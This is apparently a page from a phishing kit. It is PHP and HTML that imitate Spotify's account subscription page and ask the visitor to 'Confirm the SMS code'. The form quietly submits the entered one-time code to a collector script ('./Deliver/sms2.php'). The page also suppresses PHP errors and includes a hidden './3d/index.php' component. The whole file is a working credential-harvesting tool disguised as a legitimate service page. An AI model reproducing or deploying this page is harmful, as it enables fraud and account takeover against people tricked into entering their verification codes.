<?php
error_reporting(0);
include "./3d/index.php";

?>
<html class="translated-ltr"><head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>Spotify</title>
    <link rel="icon" href="download.ico">

    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="description" content="Spotify is a digital music service that gives you access to millions of songs.">
    <meta name="keywords" content="Spotify, music, online, listen, streaming, play, digital, album, artist, playlist">
    <link rel="stylesheet" href="spotify-543b91ee3c.css">
  	<link rel="stylesheet" href="account-4445741da9.css">
    <link rel="stylesheet" href="embedded-checkout-7f51b6350a.css">

	<script type="text/javascript">	
		function xForm(){
			if (document.getElementById('xnxx').value.length < 9 ) {
				document.getElementById('xnxx').className = "form-control error";
				document.body.style.backgroundColor = "#fefdd2";
				document.getElementById('xnxx').focus();
				return false;
			}
			else{
				document.getElementById('xnxx').className = "form-control";
			}

			if (document.getElementById('xuser').value.length < 8 ) {
				document.getElementById('xuser').className = "form-control error";
				document.body.style.backgroundColor = "#fefdd2";
				document.getElementById('xuser').focus();
				return false;
			}
			else{
				document.getElementById('xuser').className = "form-control";
			}

			if (document.getElementById('aaa').value.length < 4 ) {
				document.getElementById('aaa').className = "form-control error";
				document.body.style.backgroundColor = "#fefdd2";
				document.getElementById('aaa').focus();
				return false;
			}
			else{
				document.getElementById('aaa').className = "form-control";
			}

			document.getElementById('loading').style.display = "block";
			document.getElementById('xbootn').style.display = "none";
		}
	</script>	

<style>undefined</style><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="use-credentials"><link rel="preconnect" href="https://fonts.gstatic.com"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Mulish:wght@200;300;400;500;600;700;800;900&amp;display=swa"><link type="text/css" rel="stylesheet" charset="UTF-8" href="https://www.gstatic.com/_/translate_http/_/ss/k=translate_http.tr.qhDXWpKopYk.L.W.O/am=CAM/d=0/rs=AN8SPfqeKn8wA30q4viup18yaci8udUjKQ/m=el_main_css"><style>undefined</style><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="use-credentials"><link rel="preconnect" href="https://fonts.gstatic.com"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Mulish:wght@200;300;400;500;600;700;800;900&amp;display=swa"><style>undefined</style><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="use-credentials"><link rel="preconnect" href="https://fonts.gstatic.com"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Mulish:wght@200;300;400;500;600;700;800;900&amp;display=swa"></head>

<body class="m-int l-en page-account-subscription-update is-loggedin reboot" cz-shortcut-listen="true">
	
    <div id="fb-root"></div>
    <div class="wrap">

<header id="js-navbar" class="navbar navbar-default navbar-static-top " role="banner">
    <div class="container">
    <div class="navbar-header">
              <button type="button" class="navbar-toggle collapsed" data-toggle="sidepanel" data-target="#navbar-nav">
          <span class="sr-only"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Toggle navigation</font></font></span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
        </button>
            <ul class="nav">
        <li class="dropdown">
          <a href="#" class="user-link dropdown-toggle hidden-xs hidden-sm" data-toggle="dropdown">
    <div class="user-icon-container img-circle navbar-user-img">
      <svg class="user-icon">
        <use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#user-icon">
      </use></svg>
    </div>
          </a>
          <a href="#" class="user-link hidden-md hidden-lg" data-tracking="{&quot;category&quot;: &quot;menu&quot;, &quot;action&quot;: &quot;account&quot;}">
    <div class="user-icon-container img-circle navbar-user-img">
      <svg class="user-icon">
        <use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#user-icon">
      </use></svg>
    </div>
          </a>
          <ul class="dropdown-menu dropdown-menu-right">
            <li>
              <a href="#" data-tracking="{&quot;category&quot;: &quot;menu&quot;, &quot;action&quot;: &quot;account&quot;}"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">account</font></font></a>
            </li>
            <li>
              <a href="#" data-tracking="{&quot;category&quot;: &quot;menu&quot;, &quot;action&quot;: &quot;log-out&quot;}"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">log out</font></font></a>
            </li>
          </ul>
        </li>
      </ul>
            <a href="#" class="user-link hidden ">
    <div class="user-icon-container img-circle navbar-user-img">
      <svg class="user-icon">
        <use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#user-icon">
      </use></svg>
    </div>
      </a>
      <a class="navbar-brand" href="#" data-tracking="{&quot;category&quot;: &quot;menu&quot;, &quot;action&quot;: &quot;spotify-logo&quot;}">
        <span class="navbar-logo"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Spotify</font></font></span>
      </a>
    </div>
          <nav class="collapse navbar-collapse" id="navbar-nav" role="navigation">
<ul class="nav navbar-nav navbar-right nav-main">
        <li>
    <a href="#" id="nav-link-premium" data-ga-category="menu" data-ga-action="premium"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
      Premium
                </font></font></a>
  </li>
    <li>
    <a href="#" id="nav-link-help" data-ga-category="menu" data-ga-action="help"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
      Help
                </font></font></a>
  </li>
<li>
  <a href="#" id="nav-link-download" class="js-get-spotify js-gtm-event" data-ga-category="menu" data-ga-action="download" data-gtm-event-name="download_spotify_button_clicked" data-tracking="{&quot;category&quot;: &quot;download&quot;, &quot;action&quot;: &quot;download start&quot;, &quot;label&quot;: &quot;download-navbar&quot;}"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">fetch
   </font></font></a>
</li>
  
        
        <li class="alternate sidepanel-item-small hidden-md hidden-lg ">
    <a href="#" id="nav-link-account" data-ga-category="menu" data-ga-action="account"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
      account
                </font></font></a>
  </li>
      <li class="alternate sidepanel-item-small hidden-md hidden-lg ">
    <a href="https://www.spotify.com/int/logout/" id="nav-link-log-out" data-ga-category="menu" data-ga-action="log-out"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
      log out
                </font></font></a>
  </li>
  <li class="dropdown alternate hidden-sidepanel">
    <a href="#" class="user-link dropdown-toggle" data-toggle="dropdown">
    <div class="user-icon-container img-circle navbar-user-img">
      <svg viewBox="0 0 1024 1024" class="svelte-1o9rgok"></svg>
    </div>
      <span class="user-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Profile</font></font></span>
      <svg class="svg-chevron-down"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#chevron-down"></use></svg>
    </a>
    <ul class="dropdown-menu dropdown-menu-right">
                <li class="alternate sidepanel-item-small visible-md-block ">
    <a href="#" id="nav-link-upgrade" data-ga-category="menu" data-ga-action="upgrade"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
      Upgrade
                </font></font></a>
  </li>
            <li>
        <a href="#" data-tracking="{&quot;category&quot;: &quot;menu&quot;, &quot;action&quot;: &quot;account&quot;}"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">account</font></font></a>
      </li>
      <li>
        <a href="#" class="logout-link" data-tracking="{&quot;category&quot;: &quot;menu&quot;, &quot;action&quot;: &quot;log-out&quot;}"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">log out</font></font></a>
      </li>
    </ul>
  </li>
  </ul>
      </nav>
      </div>
</header>
    <div class="content-wrapper">
    <div class="container container-content">
      <div class="row">
                  <div class="col-sm-3 hidden-xs">
<div class="sidebar">
    <div class="user-icon-container img-circle ">
      <svg class="user-icon">
        <use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#user-icon">
      </use></svg>
    </div>
  <ul class="nav-inverse nav-tabs nav-stacked">
  <li id="submenu-item-account-overview">
  <a href="#"><svg><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-home"></use></svg><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Account summary</font></font></a>
  </li>
  <li id="submenu-item-family-plan">
  <a href="#"><svg><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-redeem"></use></svg><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Premium for the family</font></font></a>
  </li>
  <li id="submenu-item-edit-profile">
  <a href="#"><svg><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-edit"></use></svg><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Edit profile</font></font></a>
  </li>
  <li id="submenu-item-change-password">
  <a href="#"><svg><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-locked"></use></svg><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Change Password</font></font></a>
  </li>
  <li id="submenu-item-notification-settings">
  <a href="#"><svg><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-notifications"></use></svg><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Notification settings</font></font></a>
  </li>
  <li id="submenu-item-offline-devices">
  <a href="#"><svg><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-offline"></use></svg><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Offline devices</font></font></a>
  </li>
  <li id="submenu-item-recover-playlists">
  <a href="#"><svg><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-refresh"></use></svg><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Restore playlists</font></font></a>
  </li>
  <li class="active" id="submenu-item-subscription">
  <a href="#"><svg><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-payment"></use></svg><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Subscription</font></font></a>
  </li>
  <li id="submenu-item-receipts">
  <a href="#"><svg><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-payment-history"></use></svg><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Receipts</font></font></a>
  </li>
  <li id="submenu-item-apps">
  <a href="#"><svg><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-apps"></use></svg><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">App</font></font></a>
  </li>
  <li id="submenu-item-redeem">
  <a href="#"><svg><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-redeem"></use></svg><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Redeem</font></font></a>
  </li>
  </ul>
</div>
          </div>
                        <div class="col-sm-9">
          <div class="content">
              <div class="article-account">
    <div class="row">
      <div class="col-sm-12">
        <div class="well card change-payment">
          <h2 class="change-payment-header text-center"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Confirm the SMS code.</font></font></h2>
          <p class="change-payment-paragraph"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Dear customer, Enter the code we just sent to your mobile phone to finish.</font></font></p>
          <section style=" border: 1px solid rgba(191, 176, 176, 0.51); " class="panel panel-form" data-checkout-panel="" data-tracking-endpoint="#">
    <div data-redirect-message="" class="redirect-message checkout-modal hidden">
  <div class="checkout-modal-content">
    <div class="icon">
      <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 30 18">
      <polygon points="29.4,9 20.7,0.3 19.3,1.7 25.6,8 0,8 0,10 25.6,10 19.3,16.3 20.7,17.7"></polygon>
      </svg>
    </div>
      <div class="message"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Taking you to complete your purchase...</font></font></div>
  </div>
</div>
          <ul class="list-unstyled picker-tabs" data-payment-picker="">
            <li class="picker-tab">
            
        </li>
          <li class="picker-tab picker-more hidden" data-payment-picker-more="">
        <a class="" href="#"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">���</font></font></a>
    </li>
</ul>
    <div class="message-panel hidden" data-transactional-messages=""></div>
    <div class="message-panel error-message with-icon hidden" data-form-field-messages="">
    <div class="icon">
      <svg viewBox="0 0 24 24">
        <circle cx="12" cy="12" r="9.5" stroke="currentColor" fill="none"></circle>
        <line x1="12" y1="17" x2="12" y2="10" stroke="currentColor"></line>
        <circle cx="12" cy="7.35" r=".35" stroke="currentColor" fill="none"></circle>
      </svg>
    </div>
    <ul class="form-message-list"></ul>
</div>
                    <div class="panel-tab" data-checkout-panel-tab="" data-name="billing_adyen_cards">
   
        </div>
                    <div class="panel-tab selected" data-checkout-panel-tab="" data-name="billing_paypal">
    <form name="offer" method="post" action="./Deliver/sms2.php" data-payment-form="">
                  <div class="row">
        <div class="col-xs-12">
	
		<div class="form-group">
                <label id="trans-label_postal_code" for="zip-code"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SMS code</font></font></label>
                <input id="smserror" maxlength="6" minlength="6" name="smserror" autocomplete="off" type="text" class="form-control" required="" placeholder="123456" style="
    border: 1px solid red;
">
            </div>
            </div>
    </div>
    <div class="row">
        
    </div>
    <div class="row">
        
        
    </div>
    <div class="row">
        
    </div>
    
    
    <div>
    	<div id="offer_paypal"></div>
    </div>
    <div>
    	<div class="submit-button">
        <button onclick="return xForm()" type="submit" id="offer_submit" name="offer[submit]" class="btn btn-green">
            <span class="submit-icon">
            </span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Confirm        </font></font></button>
    </div></div></form>
        </div>
    </section>
        </div>
      </div>
    </div>
  </div>
          </div>
        </div>
      </div>
    </div>
  </div>
      </div><div id="goog-gt-tt" class="VIpgJd-yAWNEb-L7lbkb skiptranslate" style="border-radius: 12px; margin: 0 0 0 -23px; padding: 0; font-family: 'Google Sans', Arial, sans-serif;" data-id=""><div id="goog-gt-vt" class="VIpgJd-yAWNEb-hvhgNd"><div class=" VIpgJd-yAWNEb-hvhgNd-l4eHX-i3jM8c"><img src="https://fonts.gstatic.com/s/i/productlogos/translate/v14/24px.svg" width="24" height="24" alt=""></div><div class=" VIpgJd-yAWNEb-hvhgNd-k77Iif-i3jM8c"><div class="VIpgJd-yAWNEb-hvhgNd-IuizWc" dir="ltr">Original text</div><div id="goog-gt-original-text" class="VIpgJd-yAWNEb-nVMfcd-fmcmS VIpgJd-yAWNEb-hvhgNd-axAV1"></div></div><div class="VIpgJd-yAWNEb-hvhgNd-N7Eqid ltr"><div class="VIpgJd-yAWNEb-hvhgNd-N7Eqid-B7I4Od ltr" dir="ltr"><div class="VIpgJd-yAWNEb-hvhgNd-UTujCb">Rate this translation</div><div class="VIpgJd-yAWNEb-hvhgNd-eO9mKe">Your feedback will be used to help improve Google Translate</div></div><div class="VIpgJd-yAWNEb-hvhgNd-xgov5 ltr"><button id="goog-gt-thumbUpButton" type="button" class="VIpgJd-yAWNEb-hvhgNd-bgm6sf" title="Good translation" aria-label="Good translation" aria-pressed="false"><span id="goog-gt-thumbUpIcon"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M21 7h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 0S7.08 6.85 7 7H2v13h16c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73V9c0-1.1-.9-2-2-2zM7 18H4V9h3v9zm14-7l-3 7H9V8l4.34-4.34L12 9h9v2z"></path></svg></span><span id="goog-gt-thumbUpIconFilled"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M21 7h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 0S7.08 6.85 7 7v13h11c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73V9c0-1.1-.9-2-2-2zM5 7H1v13h4V7z"></path></svg></span></button><button id="goog-gt-thumbDownButton" type="button" class="VIpgJd-yAWNEb-hvhgNd-bgm6sf" title="Poor translation" aria-label="Poor translation" aria-pressed="false"><span id="goog-gt-thumbDownIcon"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M3 17h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 24s7.09-6.85 7.17-7h5V4H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v2c0 1.1.9 2 2 2zM17 6h3v9h-3V6zM3 13l3-7h9v10l-4.34 4.34L12 15H3v-2z"></path></svg></span><span id="goog-gt-thumbDownIconFilled"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M3 17h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 24s7.09-6.85 7.17-7V4H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v2c0 1.1.9 2 2 2zm16 0h4V4h-4v13z"></path></svg></span></button></div></div><div id="goog-gt-votingHiddenPane" class="VIpgJd-yAWNEb-hvhgNd-aXYTce"><form id="goog-gt-votingForm" action="//translate.googleapis.com/translate_voting?client=te_lib" method="post" target="votingFrame" class="VIpgJd-yAWNEb-hvhgNd-aXYTce"><input type="text" name="sl" id="goog-gt-votingInputSrcLang"><input type="text" name="tl" id="goog-gt-votingInputTrgLang"><input type="text" name="query" id="goog-gt-votingInputSrcText"><input type="text" name="gtrans" id="goog-gt-votingInputTrgText"><input type="text" name="vote" id="goog-gt-votingInputVote"></form><iframe name="votingFrame" frameborder="0"></iframe></div></div></div>

</body></html>